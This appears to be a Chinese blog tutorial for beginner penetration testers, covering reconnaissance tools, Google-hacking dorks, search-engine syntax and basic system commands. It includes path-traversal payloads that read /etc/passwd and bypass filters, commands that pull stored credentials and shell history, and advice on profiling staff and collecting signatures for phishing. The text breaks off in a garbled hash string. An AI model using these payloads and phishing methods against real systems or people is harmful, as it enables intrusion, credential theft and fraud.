![在这里插入图片描述](https://img-blog.csdnimg.cn/20210625105740662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210719181749643.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)




### 编程语言
初学者对于常用的网站开发语言你应该至少看一遍基础教程，且至少掌握一门语言，便于后续写脚本用。
 **python**
如果你没有任何编程基础，可以首先学一下python。因为语法简单，网上公开资料多。
**JAVASCRIPT**
**JAVA**
安卓一般用java开发，安卓apk通过反编译就可以得到java文件，所以明白java特性对安卓漏洞也有好处。
**PHP**
基础自学网站 https://www.runoob.com/php/php-tutorial.html
**ASP**
#### 思想
##### MVC

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717183445298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



MVC，即 Model 模型、View 视图，及 Controller 控制器。

View：视图，为用户提供使用界面，与用户直接进行交互。
Model：模型，承载数据，并对用户提交请求进行计算的模块。其分为两类：
Controller：控制器，用于将用户请求转发给相应的 Model 进行处理，并根据 Model 的计算结果向用户提供相应响应。


MVC是一种主流的架构，是一种思想，很多源代码或CMS都是基于此思想搭建的。比如thinkphp。了解这一点对代码审计观察代码有帮助。
如图为thinkphp的MVC一个MVC结构
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210717190355188.png)


### 数据库

**经验**
一般配套数据库
asp,access
aspx,sqlserver
php,mysql：中小型网站常见使用方案
jsp,sqlserver+oracle
python,mongodb,mysql...

#### 关系型

关系型数据库是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。简单说，关系型数据库是由多张能互相连接的表组成的数据库。
一. 优点
1）都是使用表结构，格式一致，易于维护。
2）使用通用的 SQL 语言操作，使用方便，可用于复杂查询。
3）数据存储在磁盘中，安全。
二. 缺点
读写性能比较差，不能满足海量数据的高效率读写。
不节省空间。因为建立在关系模型上，就要遵循某些规则，比如数据中某字段值即使为空仍要分配空间。
固定的表结构，灵活度较低。

##### 关系型数据库代表

常见的关系型数据库有 Oracle、DB2、PostgreSQL、Microsoft SQL Server、Microsoft   
Access 和 MySQL 等。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151830704.png)

###### access
access数据库不同于其他数据库，它是一个独立的文件，有点像excel表。文件放在网站目录下，格式为mdb
###### mysql
  5.0以下（一般都是2000年左右的没有更新的网站才有）没有information_schema这个系统表，无法列表名等，只能用字典暴力跑表名、列名，这点access也是一样的。5.0以下是多用户单操作，5.0以上是多用户多操做。
  

**mysql 基本信息**

>默认端口：3306
>注释 `--`
>url使用注释一般要加上符号`+`,即`--+`。加号代表空格

#### 非关系型

非关系型数据库又被称为 NoSQL（Not Only SQL )，意为不仅仅是SQL。常见的非关系型数据库有 Neo4j、MongoDB、Redis、Memcached、MemcacheDB 和 HBase 等。通常指数据以对象的形式存储在数据库中，而对象之间的关系通过每个对象自身的属性来决定。
一. 优点
非关系型数据库存储数据的格式可以是 key-value
形式、文档形式、图片形式等。使用灵活，而关系型数据库则只支持基础类型。
速度快，效率高。NoSQL 可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘。
海量数据的维护和处理非常轻松。
非关系型数据库具有扩展简单、高并发、高稳定性、成本低廉的优势。
可以实现数据的分布式处理。
二. 缺点
非关系型数据库暂时不提供 SQL 支持，学习和使用成本较高。
非关系数据库没有事务处理，没有保证数据的完整性和安全性。适合处理海量数据，但是不一定安全。
功能没有关系型数据库完善。



### Linux

更多学习请看 https://linuxtools-rst.readthedocs.io/zh_CN/latest/index.html#

##### 权限划分
linux命令——chmod 
常利用格式为`chmod 754 file`
每个数字代表不同的组，即：所有者、用户组、其他；
数字的值对应着不同的权限的加合。1代表执行x；2代表写入w;4代表读取r　　![在这里插入图片描述](https://img-blog.csdnimg.cn/20210720185936474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 安装软件

```bash
# 安装前后一般要更新源文件
apt-get update
apt-get upgrade
apt-get dist-upgrade

apt-get install -f 安装万能的依赖包大法 
apt-get autoremove –purge 软件名 删除包及其依赖的软件包+配置文件等
dpkg -i 加文件 可以安装deb格式的安装包 
```

##### 重要目录
/etc/shadow		存放密码
/ect/crontab		存放定时任务

#### 常见有用命令

```bash
# 常用
netstat -anpt
ps -ef


# 检查状态

# 获取机密
cat /root/.bash_history	查看管理员输入的历史信息
find / -name *.cfg	查找敏感信息
```

>passwd 修改管理员密码

>touch 加文本名 创建文档

>防火墙：
>service  iptables status   查看防火墙状态
>service  iptables start		开启防火墙
>service  iptables stop		关闭防火墙
>service  iptables restart 	重启防火墙


### windows
个人系统在windows vista后，服务器系统在windows 2003以后，认证方式均为NTLM Hash；之前的(不多了)是LM hash；kerberos用于域环境认证
**DOS编程**
DOS编程教程https://blog.csdn.net/u010400728/article/details/43967181把基础看一遍，剩下的我认为重点学习一下比如`|`,`||`,`&&`，`for`大概如何用就可以了。

**常见命令**
在学命令参数前，你最重要需要学会的参数是`/?`，看图
![在这里插入图片描述](https://img-blog.csdnimg.cn/269d27eb01234b559a44c316cbb46379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


熟悉以下命令，这部分对于了解你所在的windows环境很有帮助

```bash
# 常用
systeminfo	用来看打补丁
whoami	
ipconfig
net user
tasklist 

# 提权会用到的
cmdkey /l	把凭证取下来>本地解密
netstat -ano
# 域下环境

```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210718222549927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### powshell
现在一些提权项目不满足于仅限cmd的执行了，通常需要powershell，你可以在你打开cmd后输入powershell。如下图打开了powershell
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071823320195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
## 常见文件含义
**.htaccess**
限制用户访问一些关键目录，如普通用户数据库目录会爆403，404页面与标配不一样等，就是因为配置了此文件。常见的写法如下：
```bash
<Files  ~ "^.*.([Ll][Oo][Gg])|([eE][xX][eE])">
 Order allow,deny
 Deny from all
</Files>
```
更多阅读，apache的.htaccess文件作用和相关浅析 https://www.jianshu.com/p/81305ca91ebd
# 信息收集

如果你是攻击中小型网站，你信息搜集第一步是获取网站全貌，在着重点于收集网站第三方或源码，这会加快你的渗透速度。
最后无法搜集到才是做常规信息搜集。
（搜集完之后对网站进行分类，优先测试最可能存在的漏洞点）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210520155239679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


## 信息搜集开源项目
https://github.com/bit4woo/teemo



## web组成框架信息收集


### 中间件

apache,iis,tomcat,nginx
### 源码层面收集

通研究源代码，能够发现一些敏感目录。

查看header:contype
文件命名规则
#### github
github除了很可能存在源码以外，也会记录下作者提交的删除的历史记录。这些历史记录可能保留着重要的如密码等敏感数据
**Truffle Hog**工具会扫描不同的提交历史记录和分支来获取高机密的密钥，并输出它们。这对于查找机密数据、密码、密钥等非常有用。

```bash
cd /opt/trufflehog/truffleHog
python truffleHog.py https://github.com/cyberspacekittens/dnscat2
```
****
在查看大型项目时，**Git-all-secrets** 非常有用

### CMS识别

常见的开源CMS有

```bash
Dedecms discuz phpcms wordpress zblog phpweb aspcms
```

**识别方法1：利用工具**
百度搜索关键词打开链接：CMS在线识别网站

网上的公开cms识别原理是通过匹配识别的hash值字典匹配

**识别方法2：观察网站信息**
查看网站的powered by.。

看F12中特别路径名，在百度搜索名字有可能出



主动探测是与目标机器做交互。在做交互时不可避免会留下痕迹。如何隐藏自己请看技巧的代理小节



**js信息收集**
主要是爬取网站的敏感js文件，js中能收集到的信息:

* 增加攻击面(url、域名)
* 敏感信息(密码、API密钥、加密方式)
* 代码中的潜在危险函数操作
* 具有已知漏洞的框架

常用的工具
速度很快的jsfinder https://github.com/Threezh1/JSFinder

xray的rad爬虫 https://github.com/chaitin/rad

能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN

## 特殊信息

#### 备案

注册人
查询域名注册邮箱
通过备案号查询域名
反查注册邮箱
反查注册人
通过注册人查询到的域名在查询邮箱
通过上一步邮箱去查询域名
域名登记

#### 特殊文件

**网站使用说明书**

通常包含一些敏感信息，比如登录敏感目录，管理员默认密码，密码长度等
****
目标网盘或第三方网盘敏感文件信息
#### 公司

**企业附属品**

采购巩固、版权声明

专利

软著

知识产权

附属子孙公司：这个可以会找到目标系统网络相互可通

**公司信息收集：招股书**
招股书涵盖的信息量很大，且容易获得，只需要用搜索引擎搜素：xxx招股书，即可获得。而其中许多公司得招股书中，**会有大量得资产域名**。在招股书中，其中目标公司股权结构也非常清晰。目标公司重要人员的其他重要信息也非常清晰：例如**手写签名：（用于后期钓鱼）**。
**例如注册商标：**（用户了解更多的目标资产与品牌）。**股权结构，需要重点关注，非技术类人员，**例如：销售，财务，后勤等职务的人员。此类人员是目标的重要人员，而且此类人员相对其他技术类人员安全意识较若，为“钓鱼”而铺垫。
查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。

**公司信息收集：人肉目标对象**
对目标人物初级收集通常要定在非技术人员，这类人员特征是在领英和脉脉上照片是西装。
般的大型内网渗透中，需要关注大致几个组
（1）IT组/研发组    他们掌握在大量的内网密码，数据库密码等。收集研发最好的入口点是他们运营的网站，网站中可能包含网站的开发、管理维护等人员的信息。
（2）秘书组     他们掌握着大量的目标机构的内部传达文件，为信息分析业务提供信息，在反馈给技术业务来确定渗透方向
（3）domain admins组  root/administrator
（4）财务组   他们掌握着大量的资金往来与目标企业的规划发展，并且可以通过资金，来判断出目标组织的整体架构
（5）CXX组 ceo cto coo等，不同的目标组织名字不同，如部长，厂长，经理等。

通过领英和脉脉可以获得目标人物的姓名，邮箱，职务，手机，微信等等。

**企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，**

**查询企业备案**
主要针对与国内网站备案。
站长之家 http://icp.chinaz.com
天眼查
ICP备案查询网

#### 网站附属产品

**APP**

* 七麦数据： https://www.qimai.cn/，可以查到企业下一些比较冷门的app。
* ****
目标微博，公众号信息

### 拓展信息收集

#### 子域名收集

https://www.baidu.com
www 就是顶级域名，如果是https://blog.baidu.com就是他的子域名

##### 相似域名

用阿里云
万网搜索是否号被注册了

##### 方法一：爆破子域名
discover结合了Kali Linux 上的所有的子域名侦察工具，并定期进行维护更新。被动信息收集将利用下列所有的工具: Passive uses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy, Whois, multiple websites。强大。https://github.com/leebaird/discover

****
 SubBrute。SubBrute 是一个社区项目，目标是创建最快、最准确的子域枚举工具。SubBrute 背后的神奇之处在于，它使用开放的解析器作为代理来绕过 DNS 速率限制( https://www.us-cert.gov/ncas/alerts/TA13-088A )。这种设计还提供了一层匿名性，因为 SubBrute 不直接向目标的域名服务器发送流量。

SubBrute 不仅速度非常快，它还执行 DNS 爬虫功能，爬取枚举的 DNS 记录。

运行 SubBrute:
>方法1：利用工具
>
>>[站长之家：在线子域名平台：](https://tool.chinaz.com/subdomain/)
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620184055217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

>>layer挖掘机使用简单，界面细致

>Sublist3r神器，Sublist3r神器集成了Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS等等，你值得拥有。Sublist3r是一个用Python编写的子域发现工具，旨在使用来自公共资源和暴力技术的数据枚举网站的子域。公共资源包括广泛的流行搜索引擎，如谷歌，雅虎，必应，百度，Ask以及Netcraft，Virustotal，ThreatCrowd，DNSdumpster和ReverseDNS，以发现子域名。或者，您也可以对给定域名强制执行子域，然后由名为Subbrute的集成工具处理。Subbrute是一个DNS元查询蜘蛛，它使用广泛的单词列表来枚举DNS记录和子域。此工具使用打开的解析器来避免限制问题，从而阻止Subbrute完成列表或尝试所有条目。

使用方法在kali上
git clone  https://gitee.com/ngadminq/Sublist3r.git
cd Sublist3r
pip install -r requirements.txt
python sublist3r.py -d example.com
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620195312656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

>>subDomainBurte 用小字典地柜的发现三、四、甚至五级等不容被检测的域名
>>DNSsdumpster网站.你要是懒得下载sublist3r做子域名检测，那么使用这个在线工具对你也类似，搜素出的结果是一样的
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620200656369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
>>搜索引擎：这种方法被很多人推荐，但是以下例子很清晰的看到这种方法获得的结果很杂乱
>>
>>![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630002712737.png)

##### 方法二：旁站搜集

https://scan.dyboy.cn/web/webside
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021062319114246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 方法三：证书

**证书透明度**
这是一类证书，一个SSL/TLS证书通常包含子域名、邮箱地址。
https://crt.sh/（SSL证书查询）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210620185251394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



**端口扫描**
在一个网站中可能存在同个网址，但是通过端口的不同，所显示的页面也不同。

常见端口攻击:https://www.cnblogs.com/botoo/p/10475402.html




#### 目录爆破

扫描敏感文件
robots.txt
crossdomain.xml
sitemap.xml
xx.tar.gz
xx.bak
phpinfo()

 查看网站的图像、链接来自于站点的那些目录，有些目录也许能直接打开
错误信息尝试：我在对一些网站故意输入错误信息时，它弹出来报错界面，而这个报错界面通常就包含它的目录。比如我尝试链接注入XSS语句，或我尝试空密码输入等

url/login 的 login 换成reg、register、sign字段
查看robots.txt文件，对于一些简单的马大哈网站这个配置文件将会包含信息
www.xxx.com/admin 加上/login.aspx(php)
www.xxx.com 加上/static;/backup

##### 工具

**御剑后台扫描珍藏版**
御剑后台扫描珍藏版:用于爆破目录，同时通过爆破出来的目录就可以知道网站是什么语言写的比如/admin/login.aspx就是用aspx。

御剑后台扫描珍藏版下载网站](https://www.nnapp.cn/?post=211)；御剑55w增强版字典[文章有百度网盘链接](https://www.icode9.com/content-4-87412.html); 御剑85w 字典：http://www.coder100.com/index/index/content/id/833812

使用十分简单。但是我在对同一个站点进行扫描两次的时候，发现结果不一样，因为我网速不好，但采用了默认的中断时常3秒。但目录有限，四万多很多都是php文件路径，目录路径，如果你的电脑能受得了。可以选择........
更正：也可以是ip
![御剑](https://img-blog.csdnimg.cn/20210609115717971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名
**dirbuster**
kali自带ka的一款工具，fuzz很方便。kali中直接在命令行中输入dirbuster，我认为该工具更强大，同样支持字典，还支持递归搜索和纯粹爆破，纯粹爆破你可以选择A-Z0-9a-z_，对于定向攻击来说纯粹爆破太强大了，直接帮助我发现隐藏各个目录,我在利用纯粹爆破将线程拉到50，仍旧需要10000+天以上（缺点是我用虚拟机跑的，字典大就慢）


##### 目录爆破经验

网上很多目录爆破只讲述了通过御剑或类似工具对URL进行拼接
还存在于网站中可访问本站资源的位置。比如图像。
有的站点资源目录不是使用..来回到上级，而是采用绝对路径。这明确的暴露了我们与根目录有多少层级可以通过转化相对路径来到达。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210609114611136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
爆破目录后，只需要攻破爆破的目录就意味着你攻破了主目录。有时候有的目录与主目录代码架构完全不一样，这意味着你攻破的路径更宽。

##### 图像

简单的右键单击查看了它的显示图像作为查看图像。
调整您的 burp 套件以捕获正在进行的HTTP 请求并将其与Repeater共享
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604142648871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在 GET 请求中，在上图中，您可以注意到filename=67.jpg，让我们尝试更改此文件名

```bash
filename=../../../etc/passwd

```

成功

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060414274930.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### 阻塞遍历序列

当你被阻塞时，可以尝试下面的：
当“../”被阻塞了。让我们尝试在没有任何前面的值的情况下输入/etc/passwd。

使用“双点加双斜杠”来操作 URL 文件名参数，即“ ….//….//….//etc/passwd”

在 ASCII 到 URL 编码器转换器的帮助下将“../”转换为“..%252f”和已成功访问密码文件`=..%252f..%252f..%252fetc/passwd`

许多开发人员在所需变量的末尾添加“.php”扩展名，然后再将其包含在内。
因此，网络服务器将/etc/passwd解释为/etc/passwd.php，因此我们无法访问该文件。为了摆脱这个“.php”，我们尝试使用空字节字符 (%00)终止变量，这将迫使 php 服务器在解释之后立即忽略所有内容。







**IP收集**
如果有DNS需设法进行绕过，如何绕过请看本文后面章节。最后，需要在网站中直接输入域名访问以证实真伪。
**C段**
简单来说就是不同服务器上的不同站点，网站搭建用不同的服务器搭建不同的站点，但都属于同一个站点，我们可以攻击其中一个网站，通过内网渗透从而获取其他网站的权限。

在线C段查询：https://chapangzhan.com/
## 监控
监控是否有新的端口开放nmap_diff

应用程序是否发生改变

# 工具

工具这一部分除了参考我简介的基本规则，你最需要的是上手练习以及理解这些工具是做了什么事，尤其是在不知道为什么报错时。练习无话可说，别贪全能上手就行。理解工具可以用进程抓包工具，比如WSExplorer或火绒剑看软件发了什么请求。
另外这部分内容我会尽可能稀释，将会尽可能实用、精简的介绍工具。不然你阅读可能会感到乏味，部分工具的使用我会移入后续章节![在这里插入图片描述](https://img-blog.csdnimg.cn/20210716002538181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 虚拟机配置上网

桥接（Bridged）：VMnet0连接，类似与一个网络环境下的两台电脑

 网络地址转化（Network Address Translation）：Vmnet8连接，类似孕妇，虚拟机通过主机上网
 
  主机网络（Host-Only）：Vmnet1连接，虚拟机只能和主机通信不能上网。






## 学会上网
### 学会用普通搜索引擎

(以下的baidu代表站点)
你搜索其标题还可以得到更多的信息
或者搜baidu
或者搜baidu php
### 暗网

暗网下载链接，官方网址 https://www.torproject.org/zh-CN/download/   使用也很简单，我直接全点下一步安装，电脑挂上我的VPN，就可以轻松上网。
*新手可能跟我一样，逛了一圈感觉没啥东西。网上资源太少，请待我收集整理~*
*待完善：暗网黑客资源*
### google hack


1、intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件
2、intitle： 把网页标题中的某个字符作为搜索的条件
3、cache： 搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息
4、filetype/ext： 指定一个格式类型的文件作为搜索对象
5、inurl： 搜索包含指定字符的URL
6、site： 在指定的(域名)站点搜索相关内容　　
GoogleHacking其他语法
1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索
2、or 同时搜索两个或更多的关键字
3、link 搜索某个网站的链接 link:http://baidu.com即返回所有和baidu做了链接的URL
4、info 查找指定站点的一些基本信息　　GoogleHackingDatabase:
google-hacking-databaseGoogleHacking典型用法(特定资产的万能密码也要积累)

管理后台地址
inurl:"login"|inurl:"logon"|inurl:"admin"|inurl:"manage"|inurl:"manager"|inurl:"member"|inurl:"admin_login"|inurl:"ad_login"|inurl:"ad_manage"|inurl:"houtai"|inurl:"guanli"|inurl:"htdl"|inurl:"htgl"|inurl:"members"|inurl:"system"(|inurl:...) (-忽略的文件名)

错误消息

(site:域名) intext:"error"|intext:"warning"|intext:"for more information"|intext:"not found"|intext:"其他错误消息" (-排除的信息)

数据库的转储

(site:域名) # Dumping data for table(user|username|password|pass) (-排除的信息)


更多组合 我们可以把自己的搜索与能获取更好的结果的搜索项一起使用

1.当查找email时，能添加类似 通讯录 邮件 电子邮件 发送这种关键词

2.查找电话号码的时候可以使用一些类似 电话 移动电话 通讯录 数字 手机


用户名相关
(site:域名) intext:"username"|intext:"userid"|intext:"employee.ID"(|intext:...) "your username is" (-排除的信息)

密码相关

(site:域名) intext:"password"|intext:"passcode"(|intext:...) "your password is" "reminder forgotten" (-排除的信息)

公司相关

(site:域名) intext:"admin"|intext:"administrator"|intext:"contact your system"|intext:"contact your administrator" (-排除的信息)

web 服务器的软件错误消息

（site:域名）intitle:"Object not found!" "think this is a server error" (-排除的信息)

各种网络硬件设备

"Version Info" "BootVesion" "Internet Settings" 能找到 Belkin Cable/DSL路由器 ......
site:http://target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录

```bash
site:"www.baidu.com" intitle:login intext:管理|后台|登录|用户名|密码|验证码|系统|账号|manage|admin|login|system
```

上传类漏洞地址

site:http://target.com inurl:file
site:http://target.com inurl:upload

注入页面

site:http://target.com inurl:php?id=
（批量注入工具、结合搜索引擎）


目录遍历漏洞
site:http://target.com intitle:index.of

SQL错误

site:http://target.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:”Warning: mysql_query()" | intext:”Warning: pg_connect()"

phpinfo()

site:http://target.com ext:php intitle:phpinfo "published by the PHP Group"

配置文件泄露

```bash
site:http://target.com ext:.xml | .conf | .cnf | .reg | .inf | .rdp | .cfg | .txt | .ora | .ini
```

数据库文件泄露

```bash
site:http://target.com ext:.sql | .dbf | .mdb | .db
```

日志文件泄露

```bash
site:http://target.com ext:.log
```

备份和历史文件泄露

```bash
site:http://target.com ext:.bkf | .bkp | .old | .backup | .bak | .swp | .rar | .txt | .zip | .7z | .sql | .tar.gz | .tgz | .tar
```

公开文件泄露

```bash
site:http://target.com filetype:.doc .docx | .xls | .xlsx | .ppt | .pptx | .odt | .pdf | .rtf | .sxw | .psw | .csv
```

邮箱信息

```bash
site:http://target.com intext:邮件 | email |@http://target.com 
```

社工信息

```bash
site:http://target.com intitle:账号 | 密码 | 工号 | 学号 | 身份z
```



### 空间搜索引擎

大多数空间搜索引擎爬虫相比于谷歌百度等都更及时和更深层，比如通常爬几分钟之前.使用的时候你应该将ip或url测试所有的空间搜索引擎工具，因为它得到的结果是不一样的。

#### Shodan

要收费，我在淘宝上买了别人的会员号，大概30多终身一个号。
 Shodan上搜索出来的可不是单纯的信息，而是所有接入互联网的设备！比如你的电脑、手机、摄像头甚至打印机。[官网地址](https://www.shodan.io)
 shodan可以搜索以下关键词：
 **摄像头**
网络摄像头 webcan、netcam

traffic signals

**路由器**
Ciso

**GPS**
GPS
**端口**
port:80/3389
port:80,21


hostname：　　搜索指定的主机或域名，例如 hostname:”google”
port：　　搜索指定的端口或服务，例如 port:”21”
country：　　搜索指定的国家，例如 country:”CN”
city：　　搜索指定的城市，例如 city:”Hefei”
org：　　搜索指定的组织或公司，例如 org:”google”
isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”
product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”
version：　　搜索指定的软件版本，例如 version:”1.6.2”
geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”
before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”
net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”


####  censys搜索引擎
censys搜索引擎功能与shodan类似,只是搜索功能免费，证书分析功能不错。
地址：https://search.censys.io/search?resource=hosts

搜索语法

默认情况下censys支全文检索。

23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not
80.http.get.status_code: 200　　指定状态
80.http.get.status_code:[200 TO 300]　　200-300之间的状态码
location.country_code: DE　　国家
protocols: (“23/telnet” or “21/ftp”)　　协议
tags: scada　　标签
80.http.get.headers.server：nginx　　服务器类型版本
autonomous_system.description: University　　系统描述


#### 钟馗之眼

钟馗之眼搜索引擎偏向web应用层面的搜索。
地址：https://www.zoomeye.org/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701174924633.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

搜索语法

app:nginx　　组件名
ver:1.0　　版本
os:windows　　操作系统
country:”China”　　国家
city:”hangzhou”　　城市
port:80　　端口
hostname:google　　主机名
site:thief.one　　网站域名
desc:nmask　　描述
keywords:nmask’blog　　关键词
service:ftp　　服务类型
ip:8.8.8.8　　ip地址
cidr:8.8.8.8/24　　ip地址段


#### FoFa搜索引擎

FoFa搜索引擎偏向资产搜索。
地址：https://fofa.so
语法不必特意去学，在访问界面中就有
当你在发现所寻找的正规网站，空间搜索引擎结果返回一些其他国家的网站，你不用太在意这种干扰，这是网站在做seo的结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210630194435802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



#### Dnsdb搜索引擎

dnsdb搜索引擎是一款针对dns解析的查询平台。
地址：https://www.dnsdb.io/



## DNS信息收集

使用 Dig 执行 Zone Transfer 的结果与使用 NSLookup 的结果相同。两者之间的主要区别在于其输出的格式。在选择使用这两种工具中的哪一种时，取决于偏好和可用性
以下展示了DNS的正向查询与反向查询结果

### dig

执行反向 DNS 查找将 IP 地址转换为其主机名。为此，我们需要以相反的顺序写入 IP 地址（例如 192.168.1.1 将是 1.1.168.192），然后附加“.in-addr.arpa”。到它。接下来我们需要使用 DIG 查询 PTR 记录。让我们对 216.92.251.5 进行 DNS PTR 查询，这里的命令是“dig 5.251.92.216.in-addr.arpa PTR”

### nslookup

![/](https://img-blog.csdnimg.cn/20210602183521855.png)
如您从这张图片中看到的，我们从我们执行的查询中只收到了一条记录。我们获得这个单一结果是因为我们没有指定查询类型。默认情况下，如果未指定查询类型，nslookup 将检索域的 A 记录。

要指定查询类型，您需要在命令中添加“-query=”选项。以下是您可以选择的查询类型列表。

NS：查询给定名称服务器的域 NS 记录
PTR：查询 IP 地址的反向查找（PTR 记录）
ANY：查询任何可用记录
AXFR：查询域的整个区域文件的给定名称服务器
MX：查询域的邮件服务器（MX 记录）
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210612235509451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### hash相关工具

#### 识别

kali上有集成hashid。HashID 是由 psypanda 创建的用于替代 hash-identifier 的工具。HashID 可以使用正则表达式识别超过 210 种独特的哈希类型。此外，它可以识别单个散列、解析文件或读取目录中的文件以及其中的 id 散列。使用 hashid 的语法是“hashid 选项输入”。例如，如果您想确定散列的散列类型“2b4d9aa78976ec807986c1ea298d32418c85581b5625796c49bd6ecc146b1ef9”，则语法将是“hashid 2b4d9aa781986c59b48c5986c598c56c598c598c58c58c5986e8c88c868c868c568c868c568c868c568c868c568c568c568c568c56796c8625796c49bd6e
